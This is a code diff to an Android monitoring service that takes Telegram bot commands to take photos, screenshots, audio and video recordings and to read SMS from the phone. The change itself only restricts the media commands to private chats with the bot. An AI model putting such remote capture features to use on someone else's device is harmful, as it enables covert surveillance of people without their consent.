@@ -4485,8 +4485,10 @@ class MonitoringService : Service() {
             return
         }
         when (command) {
-            "/photo" -> handlePhotoCommand(arg)
+            "/photo" -> handlePhotoCommand(arg, privateChat)
             "/screenshot" -> {
+                // Media menolak dipanggil dari grup (issue #1730).
+                if (!privateChat) { sendToTelegram("\uD83D\uDD12 Rincian hanya via private chat dengan bot."); return }
                 if (preferencesManager.monitoringPaused) {
                     sendToTelegram("⏸️ Monitoring dijeda. Kirim /resume dulu.")
                 } else {
@@ -4550,8 +4552,8 @@ class MonitoringService : Service() {
             "/lock" -> handleLockCommand()
             "/ring" -> handleRingCommand(arg)
             "/ping" -> handlePingCommand(arg, sentAtSec, senderOk, chatOk, senderId, privateChat)
-            "/record" -> handleRecordCommand(arg)
-            "/recordvideo" -> handleRecordVideoCommand(arg)
+            "/record" -> handleRecordCommand(arg, privateChat)
+            "/recordvideo" -> handleRecordVideoCommand(arg, privateChat)
             "/sms" -> handleSmsCommand(arg, senderId)
             "/smsconfirm" -> handleSmsConfirmCommand(senderId)
             "/lastnotify" -> handleLastNotifCommand(privateChat)
@@ -6180,7 +6182,11 @@ class MonitoringService : Service() {
     }
 
 
-    private suspend fun handleRecordCommand(arg: String) {
+    private suspend fun handleRecordCommand(arg: String, privateChat: Boolean) {
+        // Media menolak dipanggil dari grup (issue #1730):
+        // pasangan lapis override #1720 — dari privat media
+        // menuju chat privat; dari grup perintahnya ditolak.
+        if (!privateChat) { sendToTelegram("\uD83D\uDD12 Rincian hanya via private chat dengan bot."); return }
         if (tolakBateraiKritis("rekaman suara")) return
         if (preferencesManager.monitoringPaused) {
             sendToTelegram("⏸️ Monitoring dijeda. Kirim /resume dulu.")
@@ -6211,7 +6217,11 @@ class MonitoringService : Service() {
         }
     }
 
-    private suspend fun handleRecordVideoCommand(arg: String) {
+    private suspend fun handleRecordVideoCommand(arg: String, privateChat: Boolean) {
+        // Media menolak dipanggil dari grup (issue #1730):
+        // pasangan lapis override #1720 — dari privat media
+        // menuju chat privat; dari grup perintahnya ditolak.
+        if (!privateChat) { sendToTelegram("\uD83D\uDD12 Rincian hanya via private chat dengan bot."); return }
         if (tolakBateraiKritis("rekaman video")) return
         if (preferencesManager.monitoringPaused) {
             sendToTelegram("⏸️ Monitoring dijeda. Kirim /resume dulu.")
@@ -6760,7 +6770,11 @@ class MonitoringService : Service() {
     }
 
 
-    private suspend fun handlePhotoCommand(arg: String) {
+    private suspend fun handlePhotoCommand(arg: String, privateChat: Boolean) {
+        // Media menolak dipanggil dari grup (issue #1730):
+        // pasangan lapis override #1720 — dari privat media
+        // menuju chat privat; dari grup perintahnya ditolak.
+        if (!privateChat) { sendToTelegram("\uD83D\uDD12 Rincian hanya via private chat dengan bot."); return }
         if (tolakBateraiKritis("pengambilan foto")) return
         if (preferencesManager.monitoringPaused) {
             sendToTelegram("⏸️ Monitoring dijeda. Kirim /resume dulu.")
